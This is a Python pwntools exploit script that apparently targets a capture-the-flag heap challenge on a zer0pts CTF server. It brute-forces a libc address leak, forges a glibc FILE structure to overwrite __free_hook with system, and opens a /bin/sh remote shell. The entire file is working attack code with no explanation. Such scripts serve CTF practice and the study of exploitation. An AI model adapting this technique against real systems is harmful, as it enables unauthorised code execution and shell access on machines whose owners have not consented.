#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn1.ctf.zer0pts.com"
PORT = 9005
PROCESS = "./chall"


def add(k, v):
    r.sendline("1")
    r.sendlineafter(": ", k)
    r.sendlineafter(": ", str(v))
    r.recvuntil("> ")


def get(k):
    r.sendline("2")
    r.sendlineafter(": ", k)
    r.recvuntil(": ")
    resp = r.recvline()[:-1]
    r.recvuntil("> ")
    return resp


def testval(k):
    r.sendline("2")
    r.sendlineafter(": ", k)
    resp = r.recvline()[:-1]
    r.recvuntil("> ")
    return not ("Item not found" in resp)


def free(k):
    r.sendline("3")
    r.sendlineafter(": ", k)
    r.recvuntil("> ")


def brute_addr():
    result = ""

    for i in range(6):
        for ch in range(0, 256):
            if ch == 0xa:
                continue

            test = "C"*(0x80-8)
            test += p64(0)
            test += result + chr(ch)

            resp = testval(test)

            if resp:
                log.info("Found valid byte: %s" % hex(ch))
                result += chr(ch)
                break

    return result.ljust(8, "\x00")


def fake_exit():
    r.sendline("5")
    r.recvline()
    r.recvline()
    r.sendline("n")
    r.recvuntil("> ")


def save():
    r.sendline("4")
    r.recvuntil("> ")


def exploit(r):
    r.recvuntil("> ")

    add("X"*(0x500-8), 1)
    add("B"*(0x20-8), 1)
    free("X"*(0x500-8))
    free("B"*(0x20-8))
    add("C"*(0x80-8), 1)

    LIBCLEAK = u64(brute_addr())
    libc.address = LIBCLEAK - 96 - 0x10 - libc.symbols["__malloc_hook"]

    log.info("LIBC leak     : %s" % hex(LIBCLEAK))
    log.info("LIBC          : %s" % hex(libc.address))

    payload = "A"*0x1d0
    payload += p64(libc.symbols["system"])

    for i in range(7):
        add(payload, 1)
        fake_exit()                 # free fp (tcache handled)
        add("A"*(0x1000-8), 1)
        save()

    add("Y"*(0x1e0-8), 1)
    fake_exit()                     # free fp (now normal bin)

    payload = p64(0) + p64(0)                                         # flags      / read_ptr
    payload += p64(0) + p64(0)                                        # read_end   / read_base
    payload += p64(0) + p64(0)                                        # write_base / write_ptr
    payload += p64(0) + p64(libc.symbols["__free_hook"]-0x80-0x150)   # write_end  / buf_base
    payload += p64(libc.symbols["__free_hook"]+6) + p64(0x0)          # buf_end    / save_base
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(libc.bss()+0x1000)
    payload += p64(0) + p64(0)
    payload += p64(0) + p64(0)

    add(payload, 1)                 # overwrite fp struct
    save()                          # overwrite free_hook

    add("/bin/sh\x00", 2)

    # delete key /bin/sh
    r.sendline("3")
    r.sendlineafter("Key: ", "/bin/sh")
    
    r.interactive()
    
    return


if __name__ == "__main__":
    # e = ELF("./chall")

    if len(sys.argv) > 1:
        LOCAL = False
        libc = ELF("./libc-2.31.so")
        r = remote(HOST, PORT)
    else:
        LOCAL = True

        libc = ELF("./libc-2.31.so")
        r = process("./chall", env={"LD_PRELOAD": "./libc-2.31.so"})

        #libc = ELF("./libc-local.so")
        #r = process("./chall")
        print(util.proc.pidof(r))
        pause()

    exploit(r)
